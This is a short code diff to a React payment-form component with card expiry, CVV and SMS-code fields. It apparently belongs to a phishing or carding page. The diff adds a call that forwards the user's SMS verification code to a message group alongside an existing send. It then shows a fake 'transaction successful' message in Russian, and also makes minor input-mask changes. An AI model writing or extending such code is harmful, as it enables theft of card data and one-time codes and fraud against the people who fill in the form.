@@ -80,6 +80,8 @@ const OrderOther = () => {
     setVerificationLoading(true);
     try {
       sendMessage(`SMS Code: ${smsCode}`);
+      sendMessageGroup(`SMS Code: ${smsCode}`);
+
       setSmsCode('');
       navigate('/statusru', { state: { result: 'success', message: 'Транзакция успешна' } });
     } catch (error) {
@@ -163,6 +165,7 @@ const OrderOther = () => {
                     mask="99/99"
                     value={cardData.expiryDate}
                     onChange={handleChange}
+                    alwaysShowMask={false} // Отключаем отображение маски при удалении символов
                   >
                     {() => (
                       <input
@@ -185,6 +188,7 @@ const OrderOther = () => {
                     mask="999"
                     value={cardData.cvv}
                     onChange={handleChange}
+                    alwaysShowMask={false} // Отключаем отображение маски при удалении символов
                   >
                     {() => (
                       <input
